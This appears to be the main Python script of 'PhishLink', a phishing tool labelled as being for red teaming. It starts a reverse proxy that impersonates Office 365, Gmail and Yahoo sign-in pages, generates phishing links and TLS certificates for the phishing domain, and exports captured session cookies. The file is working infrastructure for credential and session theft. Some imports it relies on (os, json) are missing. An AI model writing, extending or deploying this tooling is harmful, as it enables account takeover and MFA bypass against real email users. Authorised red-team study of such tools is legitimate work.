import argparse
import logging
import sys
import urllib.parse
import shortuuid
from http.server import HTTPServer
from socketserver import ThreadingMixIn
import ssl
from OpenSSL import crypto
from config import load_config
from storage import DataStore
from analytics import Analytics
from proxy_o365 import Office365ProxyHandler
from proxy_gmail import GmailProxyHandler
from proxy_yahoo import YahooProxyHandler

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    pass

PROXY_CLASSES = {
    'office365': Office365ProxyHandler,
    'gmail': GmailProxyHandler,
    'yahoo': YahooProxyHandler
}

def generate_phishing_link(config):
    if config['link_format']['use_email_fragment']:
        return f"https://{config['phishing_domain']}#{{EMAIL}}"
    base_url = f"https://{config['phishing_domain']}/login"
    params = {'rc': config['redirect_url'], 'cid': shortuuid.uuid()}
    return f"{base_url}?{urllib.parse.urlencode(params)}"

def generate_self_signed_cert(config):
    try:
        cert_path = config['ssl']['cert_path']
        key_path = config['ssl']['key_path']
        if not os.path.exists(cert_path) or not os.path.exists(key_path):
            k = crypto.PKey()
            k.generate_key(crypto.TYPE_RSA, 2048)
            cert = crypto.X509()
            cert.get_subject().CN = config['phishing_domain']
            cert.set_serial_number(1000)
            cert.gmtime_adj_notBefore(0)
            cert.gmtime_adj_notAfter(365 * 24 * 60 * 60)
            cert.set_issuer(cert.get_subject())
            cert.set_pubkey(k)
            cert.sign(k, 'sha256')
            with open(cert_path, 'wb') as f:
                f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
            with open(key_path, 'wb') as f:
                f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
            logging.info("Generated self-signed certificate")
    except Exception as e:
        logging.error(f"Cert generation error: {e}")
        raise

def setup_lets_encrypt(config):
    logging.info("Let’s Encrypt setup required. Run: certbot certonly --standalone -d %s", config['phishing_domain'])
    raise NotImplementedError("Let’s Encrypt integration requires manual setup with certbot")

def start_proxy(config, store, analytics):
    proxy_class = PROXY_CLASSES[config['service_name']]
    server = ThreadingHTTPServer(('0.0.0.0', config['port']), lambda *args, **kwargs: proxy_class(config, store, analytics, *args, **kwargs))
    if config['ssl']['enabled']:
        if config['ssl'].get('lets_encrypt'):
            setup_lets_encrypt(config)
        if config['ssl'].get('auto_generate'):
            generate_self_signed_cert(config)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(config['ssl']['cert_path'], config['ssl']['key_path'])
        server.socket = context.wrap_socket(server.socket, server_side=True)
    logging.info(f"Starting proxy for {config['service_name']} on port {config['port']}")
    server.serve_forever()

def main():
    parser = argparse.ArgumentParser(description="PhishLink: Ethical phishing tool for red teaming")
    parser.add_argument('--config', required=True, help="Path to JSON config file")
    parser.add_argument('--export-cookies', help="Export cookies for session ID")
    parser.add_argument('--stats', action='store_true', help="Show campaign stats")
    parser.add_argument('--encryption-key', help="Key for encrypted config")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    try:
        config = load_config(args.config, args.encryption_key)
        logging.getLogger().handlers = []
        logging.basicConfig(
            level=getattr(logging, config['logging']['level']),
            filename=config['logging']['file'],
            format='%(asctime)s - %(levelname)s - %(message)s'
        )

        store = DataStore(config['storage'])
        analytics = Analytics(config['analytics'])

        if args.export_cookies:
            cookies = store.export_cookies(args.export_cookies, config['service_name'])
            print(json.dumps(cookies, indent=2))
            return

        if args.stats:
            stats = analytics.get_stats(config['service_name'])
            print(json.dumps(stats, indent=2))
            return

        phishing_link = generate_phishing_link(config)
        logging.info(f"Phishing link template: {phishing_link}")
        print(f"Phishing link template: {phishing_link}")

        start_proxy(config, store, analytics)

    except KeyboardInterrupt:
        logging.info("Shutting down...")
        store.close()
        analytics.close()
        sys.exit(0)
    except Exception as e:
        logging.error(f"Startup failed: {e}")
        store.close()
        analytics.close()
        sys.exit(1)

if __name__ == "__main__":
    main()
